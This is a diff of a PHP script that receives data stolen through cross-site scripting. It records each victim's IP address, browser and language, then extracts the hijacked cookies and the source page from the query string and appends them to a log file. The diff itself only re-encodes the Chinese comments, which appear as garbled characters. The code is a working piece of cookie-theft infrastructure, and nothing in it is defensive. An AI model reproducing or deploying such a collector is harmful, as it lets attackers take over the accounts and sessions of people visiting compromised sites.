@@ -4,28 +4,28 @@ $fvck="Slave login at: ";
 
 $border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
 
-$slaveip = "Slave IP: ".getenv('REMOTE_ADDR');   //»ñÈ¡IP
-$slaveagent = "Slave User-Agent: ".getenv('HTTP_USER_AGENT');  // ä¯ÀÀÆ÷ºÍÏµÍ³°æ±¾
-$slavelang = "Slave Lang: ".getenv('HTTP_ACCEPT_LANGUAGE');  // ÓïÑÔ
-$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //ÇëÇóÊ±¼ä
+$slaveip = "Slave IP: ".getenv('REMOTE_ADDR');   //è·å–IP
+$slaveagent = "Slave User-Agent: ".getenv('HTTP_USER_AGENT');  // æµè§ˆå™¨å’Œç³»ç»Ÿç‰ˆæœ¬
+$slavelang = "Slave Lang: ".getenv('HTTP_ACCEPT_LANGUAGE');  // è¯­è¨€
+$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //è¯·æ±‚æ—¶é—´
 //$requestdate = date(DATE_RFC822);
 
-$qstr = getenv('QUERY_STRING');  // XSS´«»ØµÄÊı¾İ
-//$qstr = base64_decode($qstr); // ½âÂëbase64
+$qstr = getenv('QUERY_STRING');  // XSSä¼ å›çš„æ•°æ®
+//$qstr = base64_decode($qstr); // è§£ç base64
 //$qstr = urldecode($qstr);
 $qstr = "XSS got: \r\n     ".urldecode($qstr);
 
 
-//°şÀëCookie
+//å‰¥ç¦»Cookie
 $slavecookie = strchr($qstr, "    [**** Cookie");
 $slavecookiepos = strpos($qstr, "    [**** Cookie");
 
-// °şÀëXSSÀ´Ô´
+// å‰¥ç¦»XSSæ¥æº
 $slaveuri = substr($qstr, 0, $slavecookiepos);
 
 
 
-// Ğ´ÈÕÖ¾
+// å†™æ—¥å¿—
 $fp = fopen("logxss.log","a");
 
 
